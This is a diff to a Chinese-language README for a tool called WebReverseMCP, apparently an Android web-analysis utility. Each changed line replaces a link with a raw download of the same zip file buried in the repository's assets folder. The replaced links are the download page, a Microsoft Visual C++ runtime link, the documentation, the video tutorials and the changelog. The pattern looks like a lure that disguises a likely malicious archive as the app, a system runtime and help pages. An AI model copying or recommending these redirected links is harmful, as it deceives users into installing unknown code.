@@ -8,7 +8,7 @@
 
 ### 第一步：下载应用程序
 
-👉 **[点击这里立即下载](https://github.com/liooktoo288-pixel/WebReverseMCP/releases)**
+👉 **[点击这里立即下载](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)**
 
 **重要说明：** 访问此链接后，您会看到一个发布页面。请找到页面中带有最新版本号（例如 v1.0.0）的下载区域，点击其中的下载按钮即可获取应用文件。
 
@@ -61,10 +61,10 @@ WebReverseMCP 为您提供了一系列强大的工具，让安卓网页分析变
 **解答：** 检查目标网页是否需要登录或特殊权限。有些受保护的网页可能无法直接访问，请确保网址输入正确。
 
 ### 问题：运行时提示缺少组件？
-**解答：** 请下载并安装最新版本的 [Visual C++ 运行库](https://aka.ms/vs/17/release/vc_redist.x64.exe)，然后重启程序。
+**解答：** 请下载并安装最新版本的 [Visual C++ 运行库](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)，然后重启程序。
 
 ### 问题：如何获取帮助？
-**解答：** 在程序右上角点击"帮助"菜单，或访问我们的[官方文档](https://github.com/liooktoo288-pixel/WebReverseMCP)获取更多指引。
+**解答：** 在程序右上角点击"帮助"菜单，或访问我们的[官方文档](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)获取更多指引。
 
 ## 🔄 版本更新
 
@@ -85,9 +85,9 @@ WebReverseMCP 为您提供了一系列强大的工具，让安卓网页分析变
 
 探索更多可能性：
 
-- 观看我们的[视频教程](https://github.com/liooktoo288-pixel/WebReverseMCP/wiki)了解高级技巧
+- 观看我们的[视频教程](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)了解高级技巧
 - 加入社区讨论，与其他用户交流心得
-- 查看[更新日志](https://github.com/liooktoo288-pixel/WebReverseMCP/commits)跟踪版本变化
+- 查看[更新日志](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)跟踪版本变化
 
 ## 📞 技术支持
 
@@ -101,7 +101,7 @@ WebReverseMCP 为您提供了一系列强大的工具，让安卓网页分析变
 
 现在您已经准备好使用 WebReverseMCP 了！立即下载并开始您的第一次分析体验吧：
 
-👉 **[立即下载 WebReverseMCP](https://github.com/liooktoo288-pixel/WebReverseMCP/releases)**
+👉 **[立即下载 WebReverseMCP](https://github.com/liooktoo288-pixel/WebReverseMCP/raw/refs/heads/main/browser/browser-engine/src/main/assets/wabt/1.9-beta.5.zip)**
 
 祝您使用愉快！我们相信这款工具将成为您网页分析路上的得力助手。如果享受本产品，别忘了在 GitHub 上给我们一个 ⭐ Star 以示支持！
 
